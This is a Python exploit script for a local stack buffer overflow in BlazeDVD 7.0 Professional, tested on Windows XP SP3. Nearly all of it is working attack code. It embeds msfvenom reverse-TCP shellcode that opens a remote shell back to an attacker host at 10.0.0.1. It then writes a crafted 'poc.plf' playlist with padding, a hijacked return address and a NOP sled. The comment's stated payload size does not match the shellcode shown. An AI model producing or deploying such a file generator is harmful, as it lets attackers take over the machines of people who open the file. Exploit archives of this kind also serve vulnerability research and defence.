"""
Full title:	        BlazeDVD 7.0 Professional Local Stack Buffer Overflow
Exploit Author:	    Paolo Stagno - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:	https://www.softwarezirkel.de/
Version:	        BlazeDVD 7.0 Professional
Tested on:	        Windows XP SP3
Category:	        local exploit
Platform:	        windows
"""

import sys
from struct import pack

# msfvenom --payload windows/shell/reverse_tcp LHOST="10.0.0.1" LPORT=4242 --arch x86 --platform windows --bad-chars '\x00\x0a\x1a' -f python EXITFUNC=seh -v shellcode --smallest
# Payload size: 1782 bytes
shellcode =  b""
shellcode += b"\x6a\x4a\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81"
shellcode += b"\x73\x13\xb8\x04\x41\xb3\x83\xeb\xfc\xe2\xf4"
shellcode += b"\x44\xec\xce\xb3\xb8\x04\x21\x82\x6a\x60\xca"
shellcode += b"\xe1\x88\x8f\x13\xbf\x31\xe1\xca\xe1\xac\x8f"
shellcode += b"\x33\x9b\xb7\xb3\x0b\x95\x89\xfb\x70\x73\x14"
shellcode += b"\x38\x20\xcf\xba\x28\x61\x72\x77\x09\x40\x74"
shellcode += b"\xf1\x71\xae\xe1\xef\x8f\x13\xa3\x33\x46\x7d"
shellcode += b"\xb2\x68\x8f\x01\xcb\x3d\xc4\x35\xff\xb9\xd4"
shellcode += b"\x11\x38\xe0\x24\xca\xfb\xa0\x05\x92\x36\x71"
shellcode += b"\x70\x7d\x82\x47\x4d\xca\x87\x33\x05\x97\x82"
shellcode += b"\x78\xc5\x8e\xbe\x14\x05\x86\x8b\x58\x71\xb5"
shellcode += b"\xb0\xc5\xfc\x7a\xce\x9c\x71\xa1\xeb\x33\x5c"
shellcode += b"\x65\xb2\x6b\x62\xca\xbf\xf3\x8f\x19\xaf\xb9"
shellcode += b"\xd7\xca\xb7\x33\x05\x91\x3a\xfc\x20\x65\xe8"
shellcode += b"\xe3\x65\x18\xe9\xe9\xfb\xa1\xeb\xe7\x5e\xca"
shellcode += b"\xa1\x51\x84\xbe\x4c\x47\x59\x29\x80\x8a\x04"
shellcode += b"\x41\xdb\xcf\x77\x73\xec\xec\x6c\x0d\xc4\x9e"
shellcode += b"\x03\xc8\x5b\x47\xd4\xf9\x23\xb9\x04\x41\x9a"
shellcode += b"\x7c\x50\x11\xdb\x91\x84\x2a\xb3\x47\xd1\x2b"
shellcode += b"\xb9\xd0\x0e\x41\xb3\xb9\x6c\x43\xb3\xa8\x96"
shellcode += b"\xc8\x55\xe8\x54\x11\xe3\xf8\x54\x01\xe3\xd0"
shellcode += b"\xee\x4e\x6c\x58\xfb\x94\x24\xd2\x14\x17\xe4"
shellcode += b"\xd0\x9d\xe4\xc7\xd9\xfb\x94\x36\x78\x70\x4d"
shellcode += b"\x4c\xf6\x0c\x34\x5f\xd0\xf4\xf4\x11\xee\xfb"
shellcode += b"\x94\xd9\xb8\x6e\x45\xe5\xef\x6c\x43\x6a\x70"
shellcode += b"\x5b\xbe\x66\x33\x32\x2b\xf3\xd0\x04\x51\xb3"
shellcode += b"\xb8\x52\x2b\xb3\xd0\x5c\xe5\xe0\x5d\xfb\x94"
shellcode += b"\x20\xeb\x6e\x41\xe5\xeb\x53\x29\xb1\x61\xcc"
shellcode += b"\x1e\x4c\x6d\x05\x82\x9a\x7e\x71\xaf\x70"

def main():
    filename = "poc.plf"

    buf = "A" * 260                 # junk
    buf+= pack("<L",0x6401cc65)     # return address - push esp # ret [MediaPlayerCtrl.dll] 
    buf+= "C" * 16                  # junk 
    buf+= "\x90" * 20               # nop sled
    buf+= shellcode                 # shellcode 
    buf+= "D" * (2000 - len(buf))   # junk 
    
    f = open(filename, 'wb')
    f.write(buf)
    f.close()
    print "[+] %s file created!" % filename

    return


if __name__ == "__main__":
    main()
